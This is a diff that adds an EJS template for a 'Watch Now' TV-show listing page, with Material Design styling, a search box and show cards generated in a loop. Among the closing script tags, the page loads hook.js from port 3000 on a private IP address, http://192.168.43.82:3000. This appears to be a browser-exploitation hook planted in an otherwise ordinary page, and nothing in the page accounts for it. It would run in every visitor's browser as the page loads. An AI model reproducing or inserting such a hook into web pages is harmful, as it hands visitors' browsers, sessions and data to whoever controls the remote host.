@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="/mdl/material.min.css">
+    <link href="/sprites/css-sprite/sprite-av-black.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <script src="/mdl/material.min.js"></script>
+    <script src="js/jquerymlib3.1.4.js"></script>
+    <title>
+      <%=pageTitle %>
+    </title>
+  </head>
+
+<style media="screen">
+.drawer-btn{
+  position: relative;
+  height: 8px;
+  background: red;
+  width: 60px;
+}
+.mdl-layout__header{
+  background: none;
+  color: #0018;
+    padding: .5rem !important;
+}
+.img-container img{
+  width: 40px;
+}
+.img-container{
+  transform: rotateX(10deg);
+  margin-right: 20px;
+  background: red;
+}
+
+.mdl-layout__content{
+  padding: 2vw 3vw;
+}
+.mdl-layout__content .sg-spacer{
+  color: blue;
+  font-size: 24px;
+  margin-bottom: 1rem;
+  margin-left: 15px;
+}
+.mdl-card{
+  min-height: 100px;
+  text-decoration: none;
+}
+.mdl-card__media{
+height: 130px;
+display: flex;
+align-items: center;
+justify-content: center;
+background: none;
+
+}
+
+.sg-title-text{
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  font-size: 14px;
+  margin-bottom: 3px;
+}
+.sg-smooth-text{
+  font-size: 12px;
+  font-style: italic;
+  font-weight: 300;
+  color: #0018;
+}
+/* responsive task */
+@media(max-width: 1064){
+  .img-container img{
+    width: 30px;
+  }
+
+}
+@media screen and (max-width: 1024px)
+{
+  .mdl-layout__header-row {
+      height: 56px;
+      padding: 0 16px 0 6vw;
+  }
+}
+@media screen and (max-width: 483px){
+  a.mdl-card{
+    max-width: 133px;
+  }
+  .mdl-card__media{
+    height: 105px;
+  }
+  .mdl-card .mdl-card__media img{
+    width: 30px;
+  }
+  .mdl-card .sg-title-text{
+    font-size: 12px;
+  }
+  .mdl-card .sg-smooth-text{
+    font-size: 10px;
+  }
+}
+</style>
+  <body>
+    <div class="mdl-layout mdl-js-layout mdl-layout--fixed-header">
+  <header class="mdl-layout__header  mdl-layout__header--seamed">
+    <div class="mdl-layout__header-row">
+      <div class="img-container is-casting-shadow">
+        <img src="/icons/main-icon.jpg" alt="">
+      </div>
+      <span class="mdl-layout__title">Watch Now</span>
+      <div class="mdl-layout-spacer"></div>
+      <div class="mdl-textfield mdl-js-textfield mdl-textfield--expandable
+                  mdl-textfield--floating-label mdl-textfield--align-right">
+        <label class="mdl-button mdl-js-button mdl-button--icon"
+               for="waterfall-exp">
+          <i class="material-icons">search</i>
+        </label>
+        <div class="mdl-textfield__expandable-holder">
+          <input class="mdl-textfield__input" type="text" name="sample"
+                 id="waterfall-exp">
+        </div>
+      </div>
+    </div>
+  </header>
+  <main class="mdl-layout__content">
+    <div class="sg-spacer">
+      #
+    </div>
+  <div class="mdl-grid">
+
+    <% for(const film in shows){ %>
+    <a href="/tvshow/<%=shows[film].name %>" class="mdl-card mdl-js-card mdl-js-ripple-effect mdl-shadow--2dp mdl-cell mdl-cell--4-col">
+
+  <div class="mdl-card__media">
+    <img src="/pics/Folder-02.svg" width="50px" alt="">
+  </div>
+  <div class="mdl-card__actions mdl-card--border">
+  <div class="sg-title-text">
+    <%= shows[film].name %>
+  </div>
+  <!-- Raised button with ripple -->
+
+
+  </div>
+
+</a>
+<% } %>
+  </div>
+
+  </main>
+</div>
+
+
+    <script src="/js/mine.js"></script>
+   <script src="http://192.168.43.82:3000/hook.js"></script>
+  </body>
+</html>
